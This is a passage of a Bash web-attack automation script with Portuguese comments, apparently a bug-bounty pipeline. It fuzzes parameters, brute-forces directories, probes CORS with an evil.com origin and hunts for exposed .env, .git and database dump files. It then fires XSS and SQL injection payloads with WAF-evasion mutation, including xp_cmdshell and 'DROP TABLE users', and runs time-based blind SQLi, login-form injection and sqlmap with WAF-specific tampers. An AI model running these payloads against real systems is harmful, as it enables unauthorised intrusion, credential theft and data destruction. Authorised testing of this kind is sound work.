  if [[ "$HAS_TRUFFLEHOG" == "true" ]]; then
    log "Rodando TruffleHog v3 nos arquivos JS..."
    local th_dir
    th_dir=$(mktemp -d)
    local th_count=0
    while IFS= read -r jsurl; do
      local fname
      fname=$(echo "$jsurl" | md5sum | cut -c1-8).js
      curl -sk --max-time "$timeout" -o "$th_dir/$fname" "$jsurl" 2>>"$error_log" || true
      th_count=$((th_count + 1))
    done < <(head -n "$limit_js_secrets" "$DIR_JS/js_files.txt")
    trufflehog filesystem "$th_dir" --json --no-verification \
      2>>"$error_log" >> "$DIR_JS/trufflehog.txt" || true
    rm -rf "$th_dir"
    success "TruffleHog: $(count "$DIR_JS/trufflehog.txt") findings ($th_count arquivos)"
  fi
}

# ============================================================
# 09 — PARAMETER EXTRACTION
# ============================================================
step_params() {
  section "09 / EXTRAÇÃO DE PARÂMETROS"

  grep "?" "$DIR_URLS/urls_clean.txt" | grep "=" | sort -u > "$DIR_PARAMS/params_raw.txt" 2>/dev/null || touch "$DIR_PARAMS/params_raw.txt"
  success "URLs com parâmetros (raw): $(count "$DIR_PARAMS/params_raw.txt")"

  # v1.0 FIX: guarda is_empty antes de rodar uro (pipe vazio não quebra)
  if is_empty "$DIR_PARAMS/params_raw.txt"; then
    warn "Nenhuma URL com parâmetros encontrada — pulando uro"
    touch "$DIR_PARAMS/params.txt" "$DIR_PARAMS/params_fuzz.txt"
  else
    uro < "$DIR_PARAMS/params_raw.txt" 2>>"$error_log" | sort -u > "$DIR_PARAMS/params.txt" || {
      warn "uro falhou — usando params_raw como fallback"
      cp "$DIR_PARAMS/params_raw.txt" "$DIR_PARAMS/params.txt"
    }
    success "Parâmetros únicos (após uro): $(count "$DIR_PARAMS/params.txt")"
    qsreplace FUZZ < "$DIR_PARAMS/params.txt" 2>/dev/null | sort -u > "$DIR_PARAMS/params_fuzz.txt" || touch "$DIR_PARAMS/params_fuzz.txt"
    success "Params normalizados: $(count "$DIR_PARAMS/params_fuzz.txt")"
  fi

  log "Validando parâmetros ativos..."
  httpx \
    -l "$DIR_PARAMS/params.txt" \
    -silent \
    -threads "$threads" \
    -mc 200,301,302,403 \
    -o "$DIR_PARAMS/params_alive.txt" 2>>"$error_log"
  success "Parâmetros com resposta: $(count "$DIR_PARAMS/params_alive.txt")"

  grep -oP '(?<=[?&])[^=&]+(?==)' "$DIR_PARAMS/params.txt" \
    | sort | uniq -c | sort -rn > "$DIR_PARAMS/param_names.txt" 2>/dev/null || touch "$DIR_PARAMS/param_names.txt"
  success "Nomes de parâmetros únicos: $(count "$DIR_PARAMS/param_names.txt")"

  if [[ "$HAS_ARJUN" == "true" ]] && ! is_empty "$DIR_DISC/alive.txt"; then
    log "Rodando Arjun (limit: $limit_arjun hosts, 3min/host)..."
    head -n "$limit_arjun" "$DIR_DISC/alive.txt" | while IFS= read -r url; do
      timeout 180 arjun -u "$url" --stable -oT "$DIR_PARAMS/arjun_raw.txt" \
        2>>"$error_log" || log_err "arjun timeout/error em $url"
    done
    [[ -f "$DIR_PARAMS/arjun_raw.txt" ]] && \
      success "Arjun: $(count "$DIR_PARAMS/arjun_raw.txt") resultados" || true
  fi
}

# ============================================================
# 10 — GF PATTERN FILTERING
# ============================================================
step_gf() {
  section "10 / FILTRAGEM GF (PADRÕES DE VULNERABILIDADE)"

  local installed_patterns=()
  while IFS= read -r p; do
    installed_patterns+=("$p")
  done < <(gf -list 2>/dev/null || true)

  local patterns=(xss sqli lfi rce ssrf redirect ssti idor debug-pages upload interestingparams aws-keys cors)

  for pattern in "${patterns[@]}"; do
    local outfile="$DIR_VULNS/${pattern}.txt"
    if printf '%s\n' "${installed_patterns[@]}" | grep -qx "$pattern" 2>/dev/null; then
      gf "$pattern" < "$DIR_PARAMS/params.txt" > "$outfile" 2>>"$error_log" || touch "$outfile"
      local n
      n=$(count "$outfile")
      [[ "$n" -gt 0 ]] && success "gf $pattern: $n candidatos" || info "gf $pattern: 0 candidatos"
    else
      warn "gf pattern '$pattern' não instalado — pulando"
      touch "$outfile"
    fi
  done

  if ! printf '%s\n' "${installed_patterns[@]}" | grep -qx "idor" 2>/dev/null; then
    info "Para instalar patterns ausentes: git clone https://github.com/1ndianl33t/Gf-Patterns && cp Gf-Patterns/*.json ~/.gf/"
  fi
}

# ============================================================
# 11 — DIRECTORY BRUTEFORCE (ffuf)
# ============================================================
step_ffuf() {
  section "11 / DIRECTORY BRUTEFORCE (ffuf)"

  if [[ "$HAS_FFUF" != "true" ]]; then
    warn "ffuf não encontrado — pulando"
    return
  fi

  local wordlist=""
  for wl in \
    /usr/share/seclists/Discovery/Web-Content/common.txt \
    /usr/share/wordlists/dirb/common.txt \
    /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt; do
    [[ -f "$wl" ]] && wordlist="$wl" && break
  done

  if [[ -z "$wordlist" ]]; then
    warn "Nenhuma wordlist para ffuf — instale: sudo apt install seclists"
    return
  fi

  log "Rodando ffuf em $limit_ffuf hosts..."
  mkdir -p "$DIR_EXTRA/ffuf"

  head -n "$limit_ffuf" "$DIR_DISC/alive.txt" | while IFS= read -r target; do
    local safe_name
    safe_name=$(echo "$target" | sed 's|https\?://||' | tr '/.' '_')
    ffuf \
      -u "${target}/FUZZ" \
      -w "$wordlist" \
      -mc 200,201,204,301,302,307,401,403 \
      -t "$threads" \
      -timeout "$timeout" \
      -silent \
      -o "$DIR_EXTRA/ffuf/${safe_name}.json" \
      -of json \
      2>>"$error_log" || true
  done

  local ffuf_count
  ffuf_count=$(find "$DIR_EXTRA/ffuf" -name "*.json" 2>/dev/null | wc -l)
  success "ffuf: $ffuf_count arquivos gerados"
}

# ============================================================
# 12 — CORS CHECK
# PERF v5.0: xargs -P parallel (30 conexões simultâneas)
# ============================================================
step_cors() {
  section "12 / CORS MISCONFIGURATION CHECK"

  log "Testando CORS em $limit_cors hosts (paralelo)..."
  touch "$DIR_EXTRA/cors_vuln.txt"

  local tmp_hosts
  tmp_hosts=$(mktemp)
  head -n "$limit_cors" "$DIR_DISC/alive.txt" > "$tmp_hosts"

  local _tout="$timeout"
  local _out="$DIR_EXTRA/cors_vuln.txt"
  local _log="$log_file"
  local _retry="$max_retries"
  export _tout _out _log _retry

  xargs -P 30 -a "$tmp_hosts" -d '\n' -I URL bash -c '
    _agents=(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36"
      "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123 Safari/537.36"
    )
    _ua="${_agents[$((RANDOM % 3))]}"
    resp=$(curl -sk --max-time "$_tout" \
      -A "$_ua" \
      -H "Origin: https://evil.com" \
      -H "Access-Control-Request-Method: GET" \
      -I "URL" 2>/dev/null)
    acao=$(echo "$resp" | grep -i "access-control-allow-origin" | tr -d "\r")
    acac=$(echo "$resp" | grep -i "access-control-allow-credentials" | tr -d "\r")
    if echo "$acao" | grep -qiE "evil\.com"; then
      if echo "$acac" | grep -qi "true"; then
        echo "[CORS CRITICO] URL — reflete Origin + credentials=true" >> "$_out"
        echo "  → ACAO: $acao" >> "$_out"
        echo "  → ACAC: $acac" >> "$_out"
      else
        echo "[CORS INFO] URL — reflete Origin (sem credentials)" >> "$_out"
        echo "  → ACAO: $acao" >> "$_out"
      fi
    elif echo "$acao" | grep -q "\*"; then
      echo "[CORS WILDCARD] URL — ACAO: *" >> "$_out"
    fi
  '

  rm -f "$tmp_hosts"
  local found
  found=$(grep -c "CORS" "$DIR_EXTRA/cors_vuln.txt" 2>/dev/null || echo 0)
  [[ "$found" -gt 0 ]] && success "CORS issues: $found hosts" || info "CORS: nenhuma misconfiguração"
}

# ============================================================
# 13 — SECURITY HEADERS CHECK
# PERF v5.0: xargs -P parallel
# ============================================================
step_headers() {
  section "13 / SECURITY HEADERS CHECK"

  log "Verificando headers em $limit_headers hosts (paralelo)..."
  touch "$DIR_EXTRA/headers_issues.txt"

  local tmp_hosts
  tmp_hosts=$(mktemp)
  head -n "$limit_headers" "$DIR_DISC/alive.txt" > "$tmp_hosts"

  local _tout="$timeout"
  local _out="$DIR_EXTRA/headers_issues.txt"
  export _tout _out

  xargs -P 30 -a "$tmp_hosts" -d '\n' -I URL bash -c '
    headers=$(curl -sk --max-time "$_tout" -I "URL" 2>/dev/null)
    issues=""
    echo "$headers" | grep -qi "strict-transport-security"  || issues="$issues Missing-HSTS"
    echo "$headers" | grep -qi "x-frame-options"            || issues="$issues Missing-X-Frame-Options"
    echo "$headers" | grep -qi "x-content-type-options"     || issues="$issues Missing-X-Content-Type-Options"
    echo "$headers" | grep -qi "content-security-policy"    || issues="$issues Missing-CSP"
    echo "$headers" | grep -qi "referrer-policy"            || issues="$issues Missing-Referrer-Policy"
    echo "$headers" | grep -qi "permissions-policy"         || issues="$issues Missing-Permissions-Policy"
    server=$(echo "$headers" | grep -i "^server:" | tr -d "\r")
    xpb=$(echo "$headers" | grep -i "^x-powered-by:" | tr -d "\r")
    [[ -n "$server" ]] && issues="$issues Server-Exposed:${server}"
    [[ -n "$xpb"    ]] && issues="$issues XPoweredBy-Exposed:${xpb}"
    [[ -n "$issues" ]] && echo "URL →$issues" >> "$_out"
  '

  rm -f "$tmp_hosts"
  success "Headers analisados: $(count "$DIR_EXTRA/headers_issues.txt") hosts com issues"
}

# ============================================================
# 14 — SENSITIVE FILES CHECK
# PERF v5.0: xargs -P parallel — até 30x mais rápido que loop serial
# N_hosts × 40_endpoints = potencialmente 800+ requests; agora paralelos
# ============================================================
step_sensitive() {
  section "14 / ARQUIVOS SENSÍVEIS"

  local sensitive_endpoints=(
    ".git/HEAD" ".git/config" ".git/COMMIT_EDITMSG"
    ".env" ".env.local" ".env.backup" ".env.prod"
    "config.php" "wp-config.php" "config.js" "config.json"
    "database.yml" "settings.py" "application.properties"
    "backup.zip" "backup.tar.gz" "db.sql" "dump.sql"
    "phpinfo.php" "info.php" "test.php"
    "admin.php" "login.php" "install.php" "setup.php"
    ".htaccess" ".htpasswd" "web.config"
    "robots.txt" "sitemap.xml"
    "swagger.json" "swagger.yaml" "api-docs" "openapi.json"
    "actuator" "actuator/env" "actuator/health"
    "health" "status" "debug" "trace"
    "server-status" "server-info"
    "package.json" "package-lock.json" "composer.json"
    ".DS_Store" "Thumbs.db"
    "crossdomain.xml" "clientaccesspolicy.xml"
  )

  touch "$DIR_EXTRA/sensitive_files.txt"

  # Gera lista completa de URLs candidatas
  local tmp_urls
  tmp_urls=$(mktemp)

  while IFS= read -r host; do
    local base="${host%/}"
    for endpoint in "${sensitive_endpoints[@]}"; do
      printf '%s/%s\n' "$base" "$endpoint"
    done
  done < <(head -n "$limit_sensitive" "$DIR_DISC/alive.txt") > "$tmp_urls"

  local total_checks
  total_checks=$(wc -l < "$tmp_urls")
  log "Verificando $total_checks URLs sensíveis em paralelo (30 workers)..."

  local _tout="$timeout"
  local _out="$DIR_EXTRA/sensitive_files.txt"
  export _tout _out

  # xargs -P 30: 30 curl simultâneos — append com O_APPEND é atômico no Linux
  xargs -P 30 -a "$tmp_urls" -d '\n' -I URL bash -c '
    status=$(curl -sk --max-time "$_tout" -o /dev/null -w "%{http_code}" "URL" 2>/dev/null)
    case "$status" in
      200)     echo "[200] URL" >> "$_out" ;;
      301|302) echo "[$status] URL" >> "$_out" ;;
    esac
  '

  rm -f "$tmp_urls"

  local found
  found=$(grep -c "^\[200\]" "$DIR_EXTRA/sensitive_files.txt" 2>/dev/null || echo 0)
  [[ "$found" -gt 0 ]] && success "Arquivos sensíveis (200): $found" || info "Nenhum arquivo sensível acessível"
}

# ============================================================
# 15 — XSS SCAN
#
#  15a: Manual pre-check com inject_per_param (per-param, mais preciso)
#  15b: XSS via headers HTTP [FIX: declare -A fora do loop]
#  15c: DOM-based XSS — análise de sinks perigosos em arquivos JS
#  15d: Dalfox em pipe mode
# ============================================================
step_xss() {
  section "15 / XSS SCAN"

  touch "$DIR_SCANS/xss_manual.txt" "$DIR_SCANS/xss_headers.txt" \
        "$DIR_SCANS/xss_dom.txt"    "$DIR_SCANS/dalfox.txt"

  cat "$DIR_VULNS/xss.txt" "$DIR_PARAMS/params_alive.txt" 2>/dev/null \
    | grep "?" | grep "=" | sort -u > "$DIR_SCANS/xss_all_targets.txt"

  if is_empty "$DIR_SCANS/xss_all_targets.txt"; then
    warn "Nenhum candidato XSS — pulando"
    return
  fi

  local total_xss
  total_xss=$(count "$DIR_SCANS/xss_all_targets.txt")
  log "Total XSS targets combinados (GF + params_alive): $total_xss"

  # ── 15a: Manual reflected XSS pre-check (per-param) ────────
  local effective_xss_limit=$(( total_xss < limit_xss_manual ? total_xss : limit_xss_manual ))
  log "15a) Manual XSS pre-check em $effective_xss_limit URLs (inject_per_param)..."

  local xss_payloads=(
    '<script>alert(xss1)</script>'
    '"><script>alert(xss2)</script>'
    "\'><script>alert(xss3)</script>"
    '"><img src=x onerror=alert(xss4)>'
    "\'><img src=x onerror=alert(xss5)>"
    '<svg onload=alert(xss6)>'
    '"><svg onload=alert(xss7)>'
    '"><iframe src=javascript:alert(xss8)>'
    '"-alert(xss9)-"'
    "'-alert(xss10)-'"
    '{{xss11}}'
    '${xss12}'
  )

  while IFS= read -r url; do
    local found_xss=false
    for payload in "${xss_payloads[@]}"; do
      "$found_xss" && break
      # v1.0: mutate payload para evasão de WAF
      local active_payload
      active_payload=$(mutate_xss "$payload")
      local encoded_payload
      encoded_payload=$(url_encode "$active_payload")

      while IFS= read -r test_url; do
        local tmpf; tmpf=$(mktemp)
        retry_cfetch "$test_url" "$tmpf" >/dev/null
        local resp; resp=$(cat "$tmpf" 2>/dev/null); rm -f "$tmpf"
        if echo "$resp" | grep -qF "$active_payload"; then
          echo "[XSS REFLECTED] $test_url" >> "$DIR_SCANS/xss_manual.txt"
          echo "  → Payload: $active_payload" >> "$DIR_SCANS/xss_manual.txt"
          warn "XSS Refletido potencial: $test_url"
          found_xss=true
          break
        fi
        jitter
      done < <(inject_per_param "$url" "$encoded_payload")
    done
  done < <(head -n "$effective_xss_limit" "$DIR_SCANS/xss_all_targets.txt")

  info "15a) XSS manual pre-check: $(count "$DIR_SCANS/xss_manual.txt") suspeitos"

  # ── 15b: XSS via headers HTTP ──────────────────────────────
  # FIX v5.0: declare -A movido para FORA do loop while (era bug em v4.0)
  # FIX v1.0: head -n 20 hardcoded → limit_waf
  log "15b) XSS via headers (User-Agent / Referer / X-Forwarded-For) em $limit_waf hosts..."

  local hdr_payload
  hdr_payload=$(mutate_xss '"><script>alert(xss_header)</script>')

  declare -A header_resps

  while IFS= read -r url; do
    local _ua; _ua=$(random_ua)
    header_resps["User-Agent"]=$(curl -sk --max-time "$timeout" \
      -A "$hdr_payload" "$url" 2>/dev/null)
    header_resps["Referer"]=$(curl -sk --max-time "$timeout" \
      -A "$_ua" -H "Referer: $hdr_payload" "$url" 2>/dev/null)
    header_resps["X-Forwarded-For"]=$(curl -sk --max-time "$timeout" \
      -A "$_ua" -H "X-Forwarded-For: $hdr_payload" "$url" 2>/dev/null)

    for check_name in "User-Agent" "Referer" "X-Forwarded-For"; do
      if echo "${header_resps[$check_name]}" | grep -qF "$hdr_payload" 2>/dev/null; then
        echo "[XSS HEADER: $check_name] $url" >> "$DIR_SCANS/xss_headers.txt"
        warn "XSS via header $check_name: $url"
      fi
    done
    jitter
  done < <(head -n "$limit_waf" "$DIR_DISC/alive.txt")

  unset header_resps
  info "15b) XSS via headers: $(count "$DIR_SCANS/xss_headers.txt") suspeitos"

  # ── 15c: DOM-based XSS ─────────────────────────────────────
  log "15c) DOM-based XSS — análise de sinks em $(head -n 30 "$DIR_JS/js_files.txt" | wc -l) arquivos JS..."

  local dom_sinks=(
    'document\.write\s*\('
    'innerHTML\s*='
    'outerHTML\s*='
    'insertAdjacentHTML'
    'eval\s*\('
    'setTimeout\s*\(\s*["\x27]'
    'setInterval\s*\(\s*["\x27]'
    '\.src\s*='
    'location\.href\s*='
    'location\.replace\s*\('
    'location\.assign\s*\('
    '\$\s*\(\s*["\x27][^)]*\+.*location'
  )

  local dom_sources="location\.(search|hash|href)|URLSearchParams|getParameterByName|window\.name|document\.referrer|document\.cookie"

  while IFS= read -r jsurl; do
    local content
    content=$(curl -sk --max-time "$timeout" "$jsurl" 2>/dev/null)
    [[ -z "$content" ]] && curl_throttle && continue

    local has_source=false
    echo "$content" | grep -qiE "$dom_sources" && has_source=true

    if [[ "$has_source" == "true" ]]; then
      for sink in "${dom_sinks[@]}"; do
        if echo "$content" | grep -qiE "$sink"; then
          echo "[DOM XSS POSSIBLE] $jsurl" >> "$DIR_SCANS/xss_dom.txt"
          echo "  → Sink: $sink | Source: user-controlled input detectado" >> "$DIR_SCANS/xss_dom.txt"
          warn "DOM XSS potencial em JS: $jsurl (sink: $sink)"
          break
        fi
      done
    fi
    curl_throttle
  done < <(head -n 30 "$DIR_JS/js_files.txt")

  info "15c) DOM XSS suspeitos: $(count "$DIR_SCANS/xss_dom.txt")"

  # ── 15d: Dalfox em pipe mode ────────────────────────────────
  local dalfox_limit=$(( total_xss < 200 ? total_xss : 200 ))
  log "15d) Dalfox (pipe mode) em $dalfox_limit URLs..."

  head -n 200 "$DIR_SCANS/xss_all_targets.txt" \
    | dalfox pipe \
      --silence \
      --timeout "$timeout" \
      --worker "$max_dalfox_workers" \
      --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
      -o "$DIR_SCANS/dalfox.txt" 2>/dev/null || true

  success "15d) Dalfox: $(count "$DIR_SCANS/dalfox.txt") XSS confirmados"
  success "XSS total — Dalfox: $(count "$DIR_SCANS/dalfox.txt") | Manual: $(count "$DIR_SCANS/xss_manual.txt") | DOM: $(count "$DIR_SCANS/xss_dom.txt") | Header: $(count "$DIR_SCANS/xss_headers.txt")"
}

# ============================================================
# 16 — SQLi SCAN
#
#  16a: Error-based pre-check (inject_per_param — per-param)
#  16b: Blind time-based [FIX: mediana 3 amostras + dupla confirmação]
#  16c: POST body injection [FIX: json.dumps correto]
#  16d: SQLMap com WAF-specific tamper selection
#  16e: Ghauri como segunda ferramenta
# ============================================================
step_sqli() {
  section "16 / SQLi SCAN"

  touch "$DIR_SCANS/sqli_results.txt" "$DIR_SCANS/sqli_error_based.txt" \
        "$DIR_SCANS/sqli_blind.txt"   "$DIR_SCANS/sqli_confirmed.txt"   \
        "$DIR_SCANS/sqli_post.txt"    "$DIR_SCANS/ghauri_results.txt"

  cat "$DIR_VULNS/sqli.txt" "$DIR_PARAMS/params_alive.txt" 2>/dev/null \
    | grep "?" | grep "=" | sort -u > "$DIR_SCANS/sqli_all_targets.txt"

  if is_empty "$DIR_SCANS/sqli_all_targets.txt"; then
    warn "Nenhum candidato SQLi (GF + params_alive vazios)"
    return
  fi

  local total_targets
  total_targets=$(count "$DIR_SCANS/sqli_all_targets.txt")
  local limit_sqli_effective
  [[ $total_targets -lt $max_sqli ]] && limit_sqli_effective=$total_targets || limit_sqli_effective=$max_sqli
  log "SQLi targets: $total_targets total → testando $limit_sqli_effective"

  # ── WAF-specific tamper selection ──────────────────────────
  local tamper_arg=""
  if [[ "${WAF_DETECTED:-false}" == "true" ]]; then
    local waf_type
    waf_type=$(grep -oiE "Cloudflare|Akamai|Imperva|ModSecurity|Fortinet|F5|Sucuri" \
      "$DIR_EXTRA/waf_detected.txt" 2>/dev/null | head -1 | tr '[:upper:]' '[:lower:]')

    case "$waf_type" in
      cloudflare)  tamper_arg="--tamper=charencode,between,randomcase,space2comment,greatest"    ;;
      modsecurity) tamper_arg="--tamper=space2comment,charencode,randomcase,between"             ;;
      imperva)     tamper_arg="--tamper=charencode,equaltolike,space2comment,randomcase,between" ;;
      akamai)      tamper_arg="--tamper=between,charencode,space2comment,randomcase"             ;;
      f5)          tamper_arg="--tamper=charencode,space2comment,between,randomcase,versionedkeywords" ;;
      *)           tamper_arg="--tamper=space2comment,between,charencode,randomcase"             ;;
    esac
    warn "WAF ($waf_type) detectado → tampers: $tamper_arg"
  fi

  # ── 16a: Error-based pre-check (inject_per_param) ──────────
  log "16a) Error-based pre-check em $limit_sqli_effective targets (inject_per_param)..."

  local sql_error_payloads=(
    "'"
    "'--"
    "\"--"
    "') OR ('1'='1'--"
    "') OR 1=1--"
    "1 AND 1=2"
    "1' AND '1'='2"
    "1 UNION SELECT NULL,NULL,NULL--"
    "1 ORDER BY 1--"
    "1 ORDER BY 99--"
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
    "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
    "1;EXEC xp_cmdshell('whoami')--"
    "1' OR '1'='1'/*"
    "admin'--"
    "' OR 1=1--"
    "'; DROP TABLE users--"
  )

  local sql_error_sigs=(
    "SQL syntax.*MySQL"           "Warning.*mysql_fetch"
    "ORA-[0-9]{4}"                "Microsoft SQL Native Client"
    "Unclosed quotation mark"     "SQLSTATE\["
    "Syntax error.*PostgreSQL"    "Incorrect syntax near"
    "sqlite.*error"               "quoted string not properly terminated"
    "com\.microsoft\.sqlserver"   "org\.postgresql"
    "java\.sql\.SQLException"     "You have an error in your SQL"
    "mysql_num_rows"              "pg_query\(\)"
    "Warning.*pg_"                "supplied argument is not a valid MySQL"
    "valid MySQL result"          "MySQLSyntaxErrorException"
    "com\.mysql\.jdbc"            "Zend_Db_(Adapter|Statement)_Exception"
    "PDOException"                "ADODB"
    "JDBC Driver"                 "Dynamic SQL Error"
    "ODBC Microsoft Access"       "SQLiteException"
    "HY000"                       "ERROR 1064"
    "ERROR 1054"                  "SQLCODE"
    "DB2 SQL error"               "SQLSTATE\[HY"
    "Sybase message"              "PL/SQL"
    "ORA-06512"                   "[Microsoft][ODBC"
    "Warning.*ociexecute"         "Warning.*mssql"
  )

  while IFS= read -r url; do
    local found_vuln=false
    for payload in "${sql_error_payloads[@]}"; do
      "$found_vuln" && break
      # v1.0: mutate payload para evasão de WAF
      local active_payload
      active_payload=$(mutate_sqli "$payload")
      local encoded_payload
      encoded_payload=$(url_encode "$active_payload")

      while IFS= read -r test_url; do
        local tmpf; tmpf=$(mktemp)
        retry_cfetch "$test_url" "$tmpf" >/dev/null
        local resp; resp=$(cat "$tmpf" 2>/dev/null); rm -f "$tmpf"

        for sig in "${sql_error_sigs[@]}"; do
          if echo "$resp" | grep -qiE "$sig"; then
            echo "[ERROR-BASED SQLi] $test_url" >> "$DIR_SCANS/sqli_error_based.txt"
            echo "  → DB Signature: $sig | Payload: $active_payload" >> "$DIR_SCANS/sqli_error_based.txt"
            warn "SQLi error-based: $test_url"
            found_vuln=true
            break 2
          fi
        done
        jitter
      done < <(inject_per_param "$url" "$encoded_payload")
    done
  done < <(head -n "$limit_sqli_effective" "$DIR_SCANS/sqli_all_targets.txt")

  info "16a) Error-based: $(count "$DIR_SCANS/sqli_error_based.txt") suspeitos"

  # ── 16b: Blind time-based SQLi ─────────────────────────────
  # FIX v5.0: mediana de 3 amostras de baseline + dupla confirmação
  log "16b) Blind time-based SQLi (MySQL / MSSQL / PostgreSQL)..."

  local blind_payloads=(
    "' AND SLEEP(4)--"
    "\" AND SLEEP(4)--"
    "1 AND SLEEP(4)--"
    "') AND SLEEP(4)--"
    "1' AND IF(1=1,SLEEP(4),0)--"
    "1 AND IF(1=1,SLEEP(4),0)--"
    "'; WAITFOR DELAY '0:0:4'--"
    "1; WAITFOR DELAY '0:0:4'--"
    "'; SELECT pg_sleep(4)--"
    "1; SELECT pg_sleep(4)--"
    "' OR 1=1 AND (SELECT 1 FROM pg_sleep(4))--"
    "1 AND 1=(SELECT 1 FROM PG_SLEEP(4))--"
  )

  local blind_threshold=3

  while IFS= read -r url; do
    # FIX: mediana de 3 amostras para baseline confiável
    local s0 s1 s2 t0 t1
    t0=$(date +%s%3N)
    curl -sk --max-time "$timeout" "$url" -o /dev/null 2>/dev/null || true
    t1=$(date +%s%3N)
    s0=$(( (t1 - t0) / 1000 ))

    t0=$(date +%s%3N)
    curl -sk --max-time "$timeout" "$url" -o /dev/null 2>/dev/null || true
    t1=$(date +%s%3N)
    s1=$(( (t1 - t0) / 1000 ))

    t0=$(date +%s%3N)
    curl -sk --max-time "$timeout" "$url" -o /dev/null 2>/dev/null || true
    t1=$(date +%s%3N)
    s2=$(( (t1 - t0) / 1000 ))

    # Mediana de 3 valores
    local sorted_times
    IFS=$'\n' read -r -a sorted_times <<< "$(printf '%s\n' "$s0" "$s1" "$s2" | sort -n)"
    local t_normal="${sorted_times[1]}"

    local found_blind=false
    for payload in "${blind_payloads[@]}"; do
      "$found_blind" && break
      local encoded_payload
      encoded_payload=$(url_encode "$payload")

      while IFS= read -r test_url; do
        # Primeira medição
        local ts te elapsed1
        ts=$(date +%s%3N)
        curl -sk --max-time $((timeout + 6)) "$test_url" -o /dev/null 2>/dev/null || true
        te=$(date +%s%3N)
        elapsed1=$(( (te - ts) / 1000 ))

        if [[ $elapsed1 -ge $(( t_normal + blind_threshold )) ]]; then
          # FIX: dupla confirmação para reduzir falsos positivos
          local elapsed2
          ts=$(date +%s%3N)
          curl -sk --max-time $((timeout + 6)) "$test_url" -o /dev/null 2>/dev/null || true
          te=$(date +%s%3N)
          elapsed2=$(( (te - ts) / 1000 ))

          if [[ $elapsed2 -ge $(( t_normal + blind_threshold )) ]]; then
            echo "[BLIND TIME-BASED SQLi] $test_url" >> "$DIR_SCANS/sqli_blind.txt"
            echo "  → Payload: $payload | T1: ${elapsed1}s T2: ${elapsed2}s (baseline: ${t_normal}s)" >> "$DIR_SCANS/sqli_blind.txt"
            warn "Blind SQLi CONFIRMADO (2x): $test_url (${elapsed1}s/${elapsed2}s vs ${t_normal}s baseline)"
            found_blind=true
            break
          fi
        fi
        curl_throttle
      done < <(inject_per_param "$url" "$encoded_payload")
    done
  done < <(head -n 20 "$DIR_SCANS/sqli_all_targets.txt")

  info "16b) Blind time-based: $(count "$DIR_SCANS/sqli_blind.txt") suspeitos"

  # ── 16c: POST body injection ────────────────────────────────
  # FIX v5.0: json.dumps via python3 para serialização correta do payload
  log "16c) POST body SQLi (JSON + form-urlencoded) em endpoints de API/login..."

  local post_payloads_sql=(
    "' OR '1'='1'--"
    "' OR 1=1--"
    "admin'--"
    "1' AND SLEEP(3)--"
  )

  grep -iE "(login|auth|signin|api|user|account)" "$DIR_PARAMS/params_alive.txt" 2>/dev/null \
    | head -n 15 | while IFS= read -r url; do
    for payload in "${post_payloads_sql[@]}"; do
      # FIX: json.dumps serializa corretamente aspas, barras, etc.
      local json_body
      json_body=$(python3 -c "
import json, sys
p = sys.argv[1]
print(json.dumps({'username': p, 'password': p}))
" "$payload" 2>/dev/null || echo "{\"username\":\"x\",\"password\":\"x\"}")

      local encoded_pl
      encoded_pl=$(url_encode "$payload")

      # Test JSON body
      local resp_json
      resp_json=$(curl -sk --max-time "$timeout" \
        -X POST -H "Content-Type: application/json" \
        -d "$json_body" \
        "$url" 2>/dev/null)

      # Test form-urlencoded
      local resp_form
      resp_form=$(curl -sk --max-time "$timeout" \
        -X POST -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=${encoded_pl}&password=${encoded_pl}" \
        "$url" 2>/dev/null)

      for sig in "${sql_error_sigs[@]}"; do
        if echo "$resp_json" | grep -qiE "$sig" 2>/dev/null; then
          echo "[POST SQLi (JSON)] $url — Payload: $payload" >> "$DIR_SCANS/sqli_post.txt"
          echo "  → Signature: $sig" >> "$DIR_SCANS/sqli_post.txt"
          warn "POST SQLi detectado (JSON): $url"
          break 2
        fi
        if echo "$resp_form" | grep -qiE "$sig" 2>/dev/null; then
          echo "[POST SQLi (FORM)] $url — Payload: $payload" >> "$DIR_SCANS/sqli_post.txt"
          echo "  → Signature: $sig" >> "$DIR_SCANS/sqli_post.txt"
          warn "POST SQLi detectado (FORM): $url"
          break 2
        fi
      done
      curl_throttle
    done
  done

  info "16c) POST SQLi: $(count "$DIR_SCANS/sqli_post.txt") suspeitos"

  # ── 16d: SQLMap paralelo ────────────────────────────────────
  local sqli_dir="$DIR_SCANS/sqli_output"
  log "16d) SQLMap em $limit_sqli_effective targets (level=3 risk=2, 5 paralelo)..."

  local tmp_sqli
  tmp_sqli=$(mktemp)
  head -n "$limit_sqli_effective" "$DIR_SCANS/sqli_all_targets.txt" | while IFS= read -r url; do
    printf '%s\0' "$url"
  done > "$tmp_sqli"

  xargs -0 -P 5 -I{} bash -c '
    url="$1"
    safe=$(echo "$url" | md5sum | cut -c1-8)
    out_file="'"$sqli_dir"'/result_${safe}.txt"
    sqlmap -u "$url" \
      --batch \
      --level=3 \
      --risk=2 \
      --technique=BEUSTQ \
      --random-agent \
      --timeout='"$timeout"' \
      --retries=1 \
      --forms \
      --threads=3 \
      '"$tamper_arg"' \
      --output-dir="'"$sqli_dir"'" \
      > "$out_file" 2>/dev/null
  ' _ {} < "$tmp_sqli"

  cat "$sqli_dir"/result_*.txt > "$DIR_SCANS/sqli_results.txt" 2>/dev/null || true
  rm -f "$tmp_sqli"

  grep -iE "is vulnerable|Parameter.*injectable|sqlmap identified|Type: error-based|Type: UNION|Type: time-based|Type: boolean|Type: stacked|injectable\)" \
    "$DIR_SCANS/sqli_results.txt" > "$DIR_SCANS/sqli_confirmed.txt" 2>/dev/null || true

